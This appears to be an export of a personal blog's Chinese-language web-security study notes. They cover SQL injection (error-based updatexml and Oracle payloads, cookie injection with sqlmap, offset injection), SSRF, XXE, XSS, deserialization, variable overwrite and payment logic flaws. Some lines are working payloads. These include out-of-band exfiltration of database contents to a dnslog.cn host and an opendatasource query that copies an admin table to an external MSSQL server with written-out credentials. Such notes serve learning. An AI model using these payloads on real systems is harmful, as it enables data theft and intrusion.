class=\"number\">1</span>),<span class=\"number\">0</span>x<span class=\"number\">7</span>e),<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"attribute\">updatexml</span>(<span class=\"number\">1</span>,concat(<span class=\"number\">0</span>x<span class=\"number\">7</span>e,(SELECT column_name from information_schema.columns where table_schema = database() and table_name = &#x27;表名&#x27; limit <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">0</span>x<span class=\"number\">7</span>e),<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"attribute\">updatexml</span>(<span class=\"number\">1</span>,concat(<span class=\"number\">0</span>x<span class=\"number\">7</span>e,(SELECT 字段名 from 表名 limit <span class=\"number\">1</span>,<span class=\"number\">1</span>),<span class=\"number\">0</span>x<span class=\"number\">7</span>e),<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"PS\"><a href=\"#PS\" class=\"headerlink\" title=\"PS\"></a>PS</h3><ol>\n<li>0x7e 实际是是16进制，Mysql支持16进制，但是开头得写0x  0x7e是一个特殊符号，然后不符合路径规则报错</li>\n<li>有时可以在请求头中加上X-Forwarded-For: 进行注入</li>\n</ol>\n<h2 id=\"0x06-Cookie注入\"><a href=\"#0x06-Cookie注入\" class=\"headerlink\" title=\"0x06 Cookie注入\"></a>0x06 Cookie注入</h2><h3 id=\"and等字符被拦截的情况下，asp、aspx、php-lt-5-4-45可用\"><a href=\"#and等字符被拦截的情况下，asp、aspx、php-lt-5-4-45可用\" class=\"headerlink\" title=\"and等字符被拦截的情况下，asp、aspx、php&lt;=5.4.45可用\"></a>and等字符被拦截的情况下，asp、aspx、php&lt;=5.4.45可用</h3><p>开发滥用$_REQUEST引起的，使用Cookie注入需要URL编码</p>\n<p>在开发者工具中找到Cookie设置ID和值，再将get传参的?id=1删去，发现还是可以正常访问，说明存在Cookie注入。</p>\n<h3 id=\"设置Cookie，需要URL编码\"><a href=\"#设置Cookie，需要URL编码\" class=\"headerlink\" title=\"设置Cookie，需要URL编码\"></a>设置Cookie，需要URL编码</h3><ol>\n<li>按F12，在浏览器中修改Cookie</li>\n<li>使用BrupSuite抓包修改Cookie，在后面加上; id=171发现和get传参的结果一样</li>\n<li>通过Js，document.cookie=”id=”+escape(“171 order by 1”)</li>\n</ol>\n<p>Access查询必须后带表名，而一开始并不知道表名，union select 1,2,3,4 from 表名，这时有两个办法解决：</p>\n<ul>\n<li>查询系统自带库【MySQL MsSQL Oracle】都可以这样做，但是Access是淘汰的数据库，所以没办法，只能用第二个办法</li>\n<li>强猜 admin news user job,但是Access数据库在使用union select时可能会出错，所以一般使用 and exists (select*from 表名)判断表名，可以利用BurpSuite跑字典跑出表名</li>\n</ul>\n<p>之后要查出表内内容有两个办法：</p>\n<ul>\n<li>强猜，猜测表内有什么字段</li>\n<li>偏移注入</li>\n</ul>\n<h3 id=\"sqlmap跑Cookie注入\"><a href=\"#sqlmap跑Cookie注入\" class=\"headerlink\" title=\"sqlmap跑Cookie注入\"></a>sqlmap跑Cookie注入</h3><figure class=\"highlight dsconfig\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">sqlmap</span>.<span class=\"string\">py</span> -<span class=\"string\">u</span> <span class=\"string\">&quot;http://59.63.200.79:8004/shownews.asp&quot;</span> <span class=\"built_in\">--cookie</span> <span class=\"string\">&quot;id=171&quot;</span> <span class=\"built_in\">--level</span> <span class=\"string\">2</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x07-偏移注入\"><a href=\"#0x07-偏移注入\" class=\"headerlink\" title=\"0x07 偏移注入\"></a>0x07 偏移注入</h2><h3 id=\"使用场景\"><a href=\"#使用场景\" class=\"headerlink\" title=\"使用场景\"></a>使用场景</h3><p>在SQL注入的时候会碰到一些无法查询列名的情况，比如</p>\n<ul>\n<li>系统自带数据库的权限不够而无法访问系统自带库。</li>\n<li>当猜到表名但是无法猜到字段名的时候，可以使用偏移注入来查询表里的数据。</li>\n</ul>\n<p>表名.<em>：</em>在数据库中代表一切；.代表向下</p>\n<h3 id=\"使用步骤\"><a href=\"#使用步骤\" class=\"headerlink\" title=\"使用步骤\"></a>使用步骤</h3><figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"keyword\">admin</span>.* <span class=\"keyword\">from</span> <span class=\"keyword\">admin</span>    // 放在不同的回显点显示不同的字段的内容，回显点包含在<span class=\"keyword\">admin</span>.*内</span><br><span class=\"line\"><span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"keyword\">admin</span>.*,<span class=\"number\">10</span> <span class=\"keyword\">from</span> <span class=\"keyword\">admin</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x08-DNS注入\"><a href=\"#0x08-DNS注入\" class=\"headerlink\" title=\"0x08 DNS注入\"></a>0x08 DNS注入</h2><h3 id=\"使用场景-1\"><a href=\"#使用场景-1\" class=\"headerlink\" title=\"使用场景\"></a>使用场景</h3><p>无法直接利用漏洞获得回显，但是目标可以发起请求，此时就可以通过DNS请求的方法将想获得的数据外带出来。</p>\n<p>核心：将盲注转化为显错注入</p>\n<p>MySQL必须打开<code>secure_file_priv= </code> </p>\n<h3 id=\"函数解析\"><a href=\"#函数解析\" class=\"headerlink\" title=\"函数解析\"></a>函数解析</h3><p>load_file()读取文件</p>\n<figure class=\"highlight reasonml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select load<span class=\"constructor\">_file(&#x27;<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"params\">error</span>.1806dl.<span class=\"params\">dnslog</span>.<span class=\"params\">cn</span><span class=\"operator\">/</span><span class=\"params\">bc</span>&#x27;)</span>;</span><br><span class=\"line\">select load<span class=\"constructor\">_file(<span class=\"params\">concat</span>(&#x27;<span class=\"operator\">/</span><span class=\"operator\">/</span>&#x27;,(<span class=\"params\">select</span> <span class=\"params\">database</span>()</span>),&#x27;.<span class=\"number\">1806</span>dl.dnslog.cn/bc&#x27;));</span><br></pre></td></tr></table></figure>\n\n<p>dnslog.cn   // 网站</p>\n<h2 id=\"0x9-反弹注入\"><a href=\"#0x9-反弹注入\" class=\"headerlink\" title=\"0x9 反弹注入\"></a><strong>0x9 反弹注入</strong></h2><h3 id=\"使用场景-2\"><a href=\"#使用场景-2\" class=\"headerlink\" title=\"使用场景\"></a>使用场景</h3><p>页面没东西显示的盲注</p>\n<p>明明是SQL的注入点却无发进行注入，注入工具猜解的速度异常缓慢，错误提示信息关闭，无法返回注入结果等，这些都是在注入攻击中常常遇到的问题。为了解决这些问题，比较好的解决方法是使用反弹注入技术，而反弹注入技术需要依靠opendatasource函数。</p>\n<p>反弹注入就是把查询出来的数据发送到我们的MSSQL数据库上，此时就需要自己的MSSQL数据库和一个公网IP。</p>\n<h3 id=\"显错注入\"><a href=\"#显错注入\" class=\"headerlink\" title=\"显错注入\"></a>显错注入</h3><ol>\n<li>猜字段</li>\n<li>联合查询，要写union all select</li>\n<li>输出点要用null填充</li>\n<li>注释只有–+</li>\n<li>sysobjects查询系统表 union all select id,name,null from sysobjects where xtype =U –+</li>\n<li>syscolumns字段 union all select id,name,null from syscolumns where id=id –+</li>\n<li>查询信息 union all select id,passwd,token from admin –+</li>\n</ol>\n<h3 id=\"反弹注入\"><a href=\"#反弹注入\" class=\"headerlink\" title=\"反弹注入\"></a>反弹注入</h3><figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x27;;<span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> opendatasource(<span class=\"string\">&#x27;sqloledb&#x27;</span>,<span class=\"string\">&#x27;server=den1.mssql8.gear.host,1433;uid=xyzxyz;pwd=Ct27!_nXWji4;database=xyzxyz&#x27;</span>).xyzxyz.dbo.test <span class=\"keyword\">select</span> * <span class=\"keyword\">from</span> admin --</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"0x10-报错注入\"><a href=\"#0x10-报错注入\" class=\"headerlink\" title=\"0x10 报错注入\"></a>0x10 报错注入</h2><h3 id=\"Orcale可用\"><a href=\"#Orcale可用\" class=\"headerlink\" title=\"Orcale可用\"></a>Orcale可用</h3><p>dual是一个虚表，直接查询他只显示一个X，列名为dummy</p>\n<p>dual实际上是为了满足查询语句的结构产生的</p>\n<p>查询用户名：select user from dual</p>\n<p>调用系统函数：(获得随机值：select dbms_random.random from dual)</p>\n<p>做加减法： select 9+1 from dual</p>\n<p>查询出所有的表：union all select * from all_tables</p>\n<p>查询出当前用户的表：select * from user_tables</p>\n<p>查询出所有的字段：select * from all_tab_columns</p>\n<p>查询出当前用户的字段：select * from user_tab_columns</p>\n<p>查版本：select * from v$version</p>\n<p>rownum=1 (限制查询返回的总行数为一条)</p>\n<p>Oracle中&lt;&gt;和!=都是不等于</p>\n<p>to_nchar()转换进制</p>\n<h3 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h3><p>不用管有没有输出点</p>\n<p>不用管数据类型</p>\n<p>不用管字段数</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ctxsys.drithsx.sn(<span class=\"keyword\">user</span>,(<span class=\"keyword\">select</span> banner <span class=\"keyword\">from</span> v$<span class=\"keyword\">version</span> <span class=\"keyword\">where</span> rownum = <span class=\"number\">1</span>))</span><br></pre></td></tr></table></figure>\n\n<p>查询关于主题的对应关键词，然后因为查询失败爆出想要查询的内容</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">and</span> <span class=\"number\">1</span>=ctxsys.drithsx.sn(<span class=\"number\">1</span>,(<span class=\"keyword\">select</span> <span class=\"built_in\">table_name</span> <span class=\"keyword\">from</span> user_tables <span class=\"keyword\">where</span> rownum=<span class=\"number\">1</span> <span class=\"keyword\">and</span> <span class=\"built_in\">table_name</span>&lt;&gt;<span class=\"string\">&#x27;NEWS&#x27;</span>))</span><br></pre></td></tr></table></figure>\n\n"},{"title":"SSRF","toc":false,"date":"2021-03-25T06:37:30.000Z","description":"SSRF","_content":"\n## 0x01 SSRF\n\n服务器端请求伪造\n\n* 让目标站点发起网络请求\n* 能访问公网或内网\n\n## 0x02 挖掘\n\n可以发起网络请求的地方都可能存在SSRF\n\n* 看传参GET和POST是否含有协议判断是否存在SSRF\n  * http://\n  * url=http://\n\n* 查看本地开放了什么端口\n  * dict://127.0.0.1\n* 探测文件内容\n  * file:///\n\n","source":"_posts/SSRF.md","raw":"---\ntitle: SSRF\ntoc: false\ndate: 2021-03-25 14:37:30\ndescription: SSRF\ntags: Web安全\ncategories: Web安全\n---\n\n## 0x01 SSRF\n\n服务器端请求伪造\n\n* 让目标站点发起网络请求\n* 能访问公网或内网\n\n## 0x02 挖掘\n\n可以发起网络请求的地方都可能存在SSRF\n\n* 看传参GET和POST是否含有协议判断是否存在SSRF\n  * http://\n  * url=http://\n\n* 查看本地开放了什么端口\n  * dict://127.0.0.1\n* 探测文件内容\n  * file:///\n\n","slug":"SSRF","published":1,"updated":"2021-03-25T07:20:59.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckqmbe9nr000ticswfwibf038","content":"<h2 id=\"0x01-SSRF\"><a href=\"#0x01-SSRF\" class=\"headerlink\" title=\"0x01 SSRF\"></a>0x01 SSRF</h2><p>服务器端请求伪造</p>\n<ul>\n<li>让目标站点发起网络请求</li>\n<li>能访问公网或内网</li>\n</ul>\n<h2 id=\"0x02-挖掘\"><a href=\"#0x02-挖掘\" class=\"headerlink\" title=\"0x02 挖掘\"></a>0x02 挖掘</h2><p>可以发起网络请求的地方都可能存在SSRF</p>\n<ul>\n<li><p>看传参GET和POST是否含有协议判断是否存在SSRF</p>\n<ul>\n<li>http://</li>\n<li>url=http://</li>\n</ul>\n</li>\n<li><p>查看本地开放了什么端口</p>\n<ul>\n<li>dict://127.0.0.1</li>\n</ul>\n</li>\n<li><p>探测文件内容</p>\n<ul>\n<li>file:///</li>\n</ul>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"0x01-SSRF\"><a href=\"#0x01-SSRF\" class=\"headerlink\" title=\"0x01 SSRF\"></a>0x01 SSRF</h2><p>服务器端请求伪造</p>\n<ul>\n<li>让目标站点发起网络请求</li>\n<li>能访问公网或内网</li>\n</ul>\n<h2 id=\"0x02-挖掘\"><a href=\"#0x02-挖掘\" class=\"headerlink\" title=\"0x02 挖掘\"></a>0x02 挖掘</h2><p>可以发起网络请求的地方都可能存在SSRF</p>\n<ul>\n<li><p>看传参GET和POST是否含有协议判断是否存在SSRF</p>\n<ul>\n<li>http://</li>\n<li>url=http://</li>\n</ul>\n</li>\n<li><p>查看本地开放了什么端口</p>\n<ul>\n<li>dict://127.0.0.1</li>\n</ul>\n</li>\n<li><p>探测文件内容</p>\n<ul>\n<li>file:///</li>\n</ul>\n</li>\n</ul>\n"},{"title":"XXE","toc":false,"date":"2021-03-25T07:24:34.000Z","description":"外部实体注入","_content":"\n## 0x01 XXE\n\n外部实体注入\n\nXXE攻击:\n\n* XML声明\n* DTD模版\n* XML，模版中的数值\n\nXML是用来存储数据的\n\n## 0x02 XXE原理\n\nPHP中存在一个叫做simplexml_load_string的函数，这个函数是将XML转化为对象\n\n","source":"_posts/XXE.md","raw":"---\ntitle: XXE\ntoc: false\ndate: 2021-03-25 15:24:34\ndescription: 外部实体注入\ntags: Web安全\ncategories: Web安全\n---\n\n## 0x01 XXE\n\n外部实体注入\n\nXXE攻击:\n\n* XML声明\n* DTD模版\n* XML，模版中的数值\n\nXML是用来存储数据的\n\n## 0x02 XXE原理\n\nPHP中存在一个叫做simplexml_load_string的函数，这个函数是将XML转化为对象\n\n","slug":"XXE","published":1,"updated":"2021-03-25T09:43:53.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckqmbe9ns000wicsw8ojhcsrb","content":"<h2 id=\"0x01-XXE\"><a href=\"#0x01-XXE\" class=\"headerlink\" title=\"0x01 XXE\"></a>0x01 XXE</h2><p>外部实体注入</p>\n<p>XXE攻击:</p>\n<ul>\n<li>XML声明</li>\n<li>DTD模版</li>\n<li>XML，模版中的数值</li>\n</ul>\n<p>XML是用来存储数据的</p>\n<h2 id=\"0x02-XXE原理\"><a href=\"#0x02-XXE原理\" class=\"headerlink\" title=\"0x02 XXE原理\"></a>0x02 XXE原理</h2><p>PHP中存在一个叫做simplexml_load_string的函数，这个函数是将XML转化为对象</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"0x01-XXE\"><a href=\"#0x01-XXE\" class=\"headerlink\" title=\"0x01 XXE\"></a>0x01 XXE</h2><p>外部实体注入</p>\n<p>XXE攻击:</p>\n<ul>\n<li>XML声明</li>\n<li>DTD模版</li>\n<li>XML，模版中的数值</li>\n</ul>\n<p>XML是用来存储数据的</p>\n<h2 id=\"0x02-XXE原理\"><a href=\"#0x02-XXE原理\" class=\"headerlink\" title=\"0x02 XXE原理\"></a>0x02 XXE原理</h2><p>PHP中存在一个叫做simplexml_load_string的函数，这个函数是将XML转化为对象</p>\n"},{"title":"XSS","toc":false,"date":"2021-03-24T07:53:47.000Z","description":"XSS","_content":"\n## 0x01 XSS原理\n\n跨站脚本攻击\n\n前端代码注入，用户输入的数据被当作前端代码执行\n\n窃取Cookie，利用Cookie登录\n\n## 0x02 XSS分类\n\n- 反射型XSS\n\n- - 一次性的，必须是用户自己传参了恶意代码才能触发\n\n- 存储型XSS\n\n- - 东西会被存储，页面输出时会被当作前端代码执行\n\n- DOM型XSS\n\n## 0x03 JS触发方式\n\n- `<script>alert(1)</script>` \n\n- 伪协议触发\n\n- - javascript:alert(1)\n\n- 事件触发\n\n- - onload=alert(1)\n  - onerror=alert(1)\n\n## 0x04 反射型XSS\n\n见框就插\n\n## 0x05 存储型XSS\n\n### 存储型XSS会出现的地方\n\n- 任何可能插入数据库的地方\n- 用户注册的时候\n- 留言板\n- 上传文件的时候\n- (管理员可见的)报错信息\n- ......\n\n用户的输入，一般控制的很严格\n\n系统的获取，一般控制的不严格\n\n防御：\n\n- 正则表达式过滤\n- html实体编码 => `htmlspecialchars函数` \n\n没有办法绕过\n\n- 找一个不编码的地方\n- 编码又解码\n\n## 0x06 DOM型XSS\n\nDOM就是通过JS操作浏览器。通过JS处理后才产生的XSS\n\n页面：动态页面、静态页面 （伪静态）\n\n伪静态：动态页面伪装成静态，让黑客不来攻击。静态页面无法达成厉害的攻击\n\ndocument.write()\n\ndocument.cookie","source":"_posts/XSS.md","raw":"---\ntitle: XSS\ntoc: false\ndate: 2021-03-24 15:53:47\ndescription: XSS\ntags: Web安全\ncategories: Web安全\n---\n\n## 0x01 XSS原理\n\n跨站脚本攻击\n\n前端代码注入，用户输入的数据被当作前端代码执行\n\n窃取Cookie，利用Cookie登录\n\n## 0x02 XSS分类\n\n- 反射型XSS\n\n- - 一次性的，必须是用户自己传参了恶意代码才能触发\n\n- 存储型XSS\n\n- - 东西会被存储，页面输出时会被当作前端代码执行\n\n- DOM型XSS\n\n## 0x03 JS触发方式\n\n- `<script>alert(1)</script>` \n\n- 伪协议触发\n\n- - javascript:alert(1)\n\n- 事件触发\n\n- - onload=alert(1)\n  - onerror=alert(1)\n\n## 0x04 反射型XSS\n\n见框就插\n\n## 0x05 存储型XSS\n\n### 存储型XSS会出现的地方\n\n- 任何可能插入数据库的地方\n- 用户注册的时候\n- 留言板\n- 上传文件的时候\n- (管理员可见的)报错信息\n- ......\n\n用户的输入，一般控制的很严格\n\n系统的获取，一般控制的不严格\n\n防御：\n\n- 正则表达式过滤\n- html实体编码 => `htmlspecialchars函数` \n\n没有办法绕过\n\n- 找一个不编码的地方\n- 编码又解码\n\n## 0x06 DOM型XSS\n\nDOM就是通过JS操作浏览器。通过JS处理后才产生的XSS\n\n页面：动态页面、静态页面 （伪静态）\n\n伪静态：动态页面伪装成静态，让黑客不来攻击。静态页面无法达成厉害的攻击\n\ndocument.write()\n\ndocument.cookie","slug":"XSS","published":1,"updated":"2021-03-24T07:54:22.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckqmbe9nt0011icsw3km35bv3","content":"<h2 id=\"0x01-XSS原理\"><a href=\"#0x01-XSS原理\" class=\"headerlink\" title=\"0x01 XSS原理\"></a>0x01 XSS原理</h2><p>跨站脚本攻击</p>\n<p>前端代码注入，用户输入的数据被当作前端代码执行</p>\n<p>窃取Cookie，利用Cookie登录</p>\n<h2 id=\"0x02-XSS分类\"><a href=\"#0x02-XSS分类\" class=\"headerlink\" title=\"0x02 XSS分类\"></a>0x02 XSS分类</h2><ul>\n<li><p>反射型XSS</p>\n</li>\n<li><ul>\n<li>一次性的，必须是用户自己传参了恶意代码才能触发</li>\n</ul>\n</li>\n<li><p>存储型XSS</p>\n</li>\n<li><ul>\n<li>东西会被存储，页面输出时会被当作前端代码执行</li>\n</ul>\n</li>\n<li><p>DOM型XSS</p>\n</li>\n</ul>\n<h2 id=\"0x03-JS触发方式\"><a href=\"#0x03-JS触发方式\" class=\"headerlink\" title=\"0x03 JS触发方式\"></a>0x03 JS触发方式</h2><ul>\n<li><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code> </p>\n</li>\n<li><p>伪协议触发</p>\n</li>\n<li><ul>\n<li>javascript:alert(1)</li>\n</ul>\n</li>\n<li><p>事件触发</p>\n</li>\n<li><ul>\n<li>onload=alert(1)</li>\n<li>onerror=alert(1)</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"0x04-反射型XSS\"><a href=\"#0x04-反射型XSS\" class=\"headerlink\" title=\"0x04 反射型XSS\"></a>0x04 反射型XSS</h2><p>见框就插</p>\n<h2 id=\"0x05-存储型XSS\"><a href=\"#0x05-存储型XSS\" class=\"headerlink\" title=\"0x05 存储型XSS\"></a>0x05 存储型XSS</h2><h3 id=\"存储型XSS会出现的地方\"><a href=\"#存储型XSS会出现的地方\" class=\"headerlink\" title=\"存储型XSS会出现的地方\"></a>存储型XSS会出现的地方</h3><ul>\n<li>任何可能插入数据库的地方</li>\n<li>用户注册的时候</li>\n<li>留言板</li>\n<li>上传文件的时候</li>\n<li>(管理员可见的)报错信息</li>\n<li>……</li>\n</ul>\n<p>用户的输入，一般控制的很严格</p>\n<p>系统的获取，一般控制的不严格</p>\n<p>防御：</p>\n<ul>\n<li>正则表达式过滤</li>\n<li>html实体编码 =&gt; <code>htmlspecialchars函数</code> </li>\n</ul>\n<p>没有办法绕过</p>\n<ul>\n<li>找一个不编码的地方</li>\n<li>编码又解码</li>\n</ul>\n<h2 id=\"0x06-DOM型XSS\"><a href=\"#0x06-DOM型XSS\" class=\"headerlink\" title=\"0x06 DOM型XSS\"></a>0x06 DOM型XSS</h2><p>DOM就是通过JS操作浏览器。通过JS处理后才产生的XSS</p>\n<p>页面：动态页面、静态页面 （伪静态）</p>\n<p>伪静态：动态页面伪装成静态，让黑客不来攻击。静态页面无法达成厉害的攻击</p>\n<p>document.write()</p>\n<p>document.cookie</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"0x01-XSS原理\"><a href=\"#0x01-XSS原理\" class=\"headerlink\" title=\"0x01 XSS原理\"></a>0x01 XSS原理</h2><p>跨站脚本攻击</p>\n<p>前端代码注入，用户输入的数据被当作前端代码执行</p>\n<p>窃取Cookie，利用Cookie登录</p>\n<h2 id=\"0x02-XSS分类\"><a href=\"#0x02-XSS分类\" class=\"headerlink\" title=\"0x02 XSS分类\"></a>0x02 XSS分类</h2><ul>\n<li><p>反射型XSS</p>\n</li>\n<li><ul>\n<li>一次性的，必须是用户自己传参了恶意代码才能触发</li>\n</ul>\n</li>\n<li><p>存储型XSS</p>\n</li>\n<li><ul>\n<li>东西会被存储，页面输出时会被当作前端代码执行</li>\n</ul>\n</li>\n<li><p>DOM型XSS</p>\n</li>\n</ul>\n<h2 id=\"0x03-JS触发方式\"><a href=\"#0x03-JS触发方式\" class=\"headerlink\" title=\"0x03 JS触发方式\"></a>0x03 JS触发方式</h2><ul>\n<li><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code> </p>\n</li>\n<li><p>伪协议触发</p>\n</li>\n<li><ul>\n<li>javascript:alert(1)</li>\n</ul>\n</li>\n<li><p>事件触发</p>\n</li>\n<li><ul>\n<li>onload=alert(1)</li>\n<li>onerror=alert(1)</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"0x04-反射型XSS\"><a href=\"#0x04-反射型XSS\" class=\"headerlink\" title=\"0x04 反射型XSS\"></a>0x04 反射型XSS</h2><p>见框就插</p>\n<h2 id=\"0x05-存储型XSS\"><a href=\"#0x05-存储型XSS\" class=\"headerlink\" title=\"0x05 存储型XSS\"></a>0x05 存储型XSS</h2><h3 id=\"存储型XSS会出现的地方\"><a href=\"#存储型XSS会出现的地方\" class=\"headerlink\" title=\"存储型XSS会出现的地方\"></a>存储型XSS会出现的地方</h3><ul>\n<li>任何可能插入数据库的地方</li>\n<li>用户注册的时候</li>\n<li>留言板</li>\n<li>上传文件的时候</li>\n<li>(管理员可见的)报错信息</li>\n<li>……</li>\n</ul>\n<p>用户的输入，一般控制的很严格</p>\n<p>系统的获取，一般控制的不严格</p>\n<p>防御：</p>\n<ul>\n<li>正则表达式过滤</li>\n<li>html实体编码 =&gt; <code>htmlspecialchars函数</code> </li>\n</ul>\n<p>没有办法绕过</p>\n<ul>\n<li>找一个不编码的地方</li>\n<li>编码又解码</li>\n</ul>\n<h2 id=\"0x06-DOM型XSS\"><a href=\"#0x06-DOM型XSS\" class=\"headerlink\" title=\"0x06 DOM型XSS\"></a>0x06 DOM型XSS</h2><p>DOM就是通过JS操作浏览器。通过JS处理后才产生的XSS</p>\n<p>页面：动态页面、静态页面 （伪静态）</p>\n<p>伪静态：动态页面伪装成静态，让黑客不来攻击。静态页面无法达成厉害的攻击</p>\n<p>document.write()</p>\n<p>document.cookie</p>\n"},{"title":"unserialize反序列化漏洞","toc":false,"date":"2021-03-26T01:14:17.000Z","description":"unserialize反序列化漏洞","_content":"\n## 0x01 反序列化\n\n序列化是将对象的状态信息转为字符串储存起来，反序列化就是再将字符串转化为状态信息\n\n序列化和类是捆绑的\n\n## 0x02 利用\n\n待续","source":"_posts/unserialize反序列化漏洞.md","raw":"---\ntitle: unserialize反序列化漏洞\ntoc: false\ndate: 2021-03-26 09:14:17\ndescription: unserialize反序列化漏洞\ntags: Web安全\ncategories: Web安全\n---\n\n## 0x01 反序列化\n\n序列化是将对象的状态信息转为字符串储存起来，反序列化就是再将字符串转化为状态信息\n\n序列化和类是捆绑的\n\n## 0x02 利用\n\n待续","slug":"unserialize反序列化漏洞","published":1,"updated":"2021-03-26T07:30:54.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckqmbe9nu0014icsw3nkg1ucw","content":"<h2 id=\"0x01-反序列化\"><a href=\"#0x01-反序列化\" class=\"headerlink\" title=\"0x01 反序列化\"></a>0x01 反序列化</h2><p>序列化是将对象的状态信息转为字符串储存起来，反序列化就是再将字符串转化为状态信息</p>\n<p>序列化和类是捆绑的</p>\n<h2 id=\"0x02-利用\"><a href=\"#0x02-利用\" class=\"headerlink\" title=\"0x02 利用\"></a>0x02 利用</h2><p>待续</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"0x01-反序列化\"><a href=\"#0x01-反序列化\" class=\"headerlink\" title=\"0x01 反序列化\"></a>0x01 反序列化</h2><p>序列化是将对象的状态信息转为字符串储存起来，反序列化就是再将字符串转化为状态信息</p>\n<p>序列化和类是捆绑的</p>\n<h2 id=\"0x02-利用\"><a href=\"#0x02-利用\" class=\"headerlink\" title=\"0x02 利用\"></a>0x02 利用</h2><p>待续</p>\n"},{"title":"变量覆盖漏洞","toc":false,"date":"2021-03-26T01:13:41.000Z","description":"变量覆盖漏洞","_content":"\n## 0x01 变量覆盖\n\n变量覆盖指的是可以用我们的传参值替换程序原有的变量值\n\n## 0x02 函数解析\n\n1. extract()：从数组中将变量导入到当前的符号表\n2. parse_str()：将查询字符串解析到变量中\n3. import_request_variables()\n4. $$\n\n## 0x03 利用\n\n找到能够覆盖的点，顺藤摸瓜，构造SESSION参数获取管理员权限","source":"_posts/变量覆盖漏洞.md","raw":"---\ntitle: 变量覆盖漏洞\ntoc: false\ndate: 2021-03-26 09:13:41\ndescription: 变量覆盖漏洞\ntags: Web安全\ncategories: Web安全\n---\n\n## 0x01 变量覆盖\n\n变量覆盖指的是可以用我们的传参值替换程序原有的变量值\n\n## 0x02 函数解析\n\n1. extract()：从数组中将变量导入到当前的符号表\n2. parse_str()：将查询字符串解析到变量中\n3. import_request_variables()\n4. $$\n\n## 0x03 利用\n\n找到能够覆盖的点，顺藤摸瓜，构造SESSION参数获取管理员权限","slug":"变量覆盖漏洞","published":1,"updated":"2021-03-26T08:35:05.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckqmbe9nv0019icswdm1y6u05","content":"<h2 id=\"0x01-变量覆盖\"><a href=\"#0x01-变量覆盖\" class=\"headerlink\" title=\"0x01 变量覆盖\"></a>0x01 变量覆盖</h2><p>变量覆盖指的是可以用我们的传参值替换程序原有的变量值</p>\n<h2 id=\"0x02-函数解析\"><a href=\"#0x02-函数解析\" class=\"headerlink\" title=\"0x02 函数解析\"></a>0x02 函数解析</h2><ol>\n<li>extract()：从数组中将变量导入到当前的符号表</li>\n<li>parse_str()：将查询字符串解析到变量中</li>\n<li>import_request_variables()</li>\n<li>$$</li>\n</ol>\n<h2 id=\"0x03-利用\"><a href=\"#0x03-利用\" class=\"headerlink\" title=\"0x03 利用\"></a>0x03 利用</h2><p>找到能够覆盖的点，顺藤摸瓜，构造SESSION参数获取管理员权限</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"0x01-变量覆盖\"><a href=\"#0x01-变量覆盖\" class=\"headerlink\" title=\"0x01 变量覆盖\"></a>0x01 变量覆盖</h2><p>变量覆盖指的是可以用我们的传参值替换程序原有的变量值</p>\n<h2 id=\"0x02-函数解析\"><a href=\"#0x02-函数解析\" class=\"headerlink\" title=\"0x02 函数解析\"></a>0x02 函数解析</h2><ol>\n<li>extract()：从数组中将变量导入到当前的符号表</li>\n<li>parse_str()：将查询字符串解析到变量中</li>\n<li>import_request_variables()</li>\n<li>$$</li>\n</ol>\n<h2 id=\"0x03-利用\"><a href=\"#0x03-利用\" class=\"headerlink\" title=\"0x03 利用\"></a>0x03 利用</h2><p>找到能够覆盖的点，顺藤摸瓜，构造SESSION参数获取管理员权限</p>\n"},{"title":"支付漏洞","toc":false,"date":"2021-03-25T03:13:48.000Z","description":"支付漏洞","_content":"\n## 0x01 快捷支付原理\n\n* 浏览器进行跳转通知：基于用户访问的浏览器（基本没了）\n* 服务器端异步通知\n\n## 0x02 支付漏洞\n\n逻辑漏洞，支付三部曲：订购、订单、付款\n\n* 修改支付价格\n  * 三个步骤中随意一个步骤进行修改价格测试，可以尝试小金额或负数\n* 修改支付状态\n  * 订单完成——未完成\n* 修改订单数量\n  * 一支笔1元，买0支或者-1支\n* 修改附属值\n  * 优惠券，修改金额大于或等于商品的价格，或者直接修改为负数\n* 越权支付\n  * 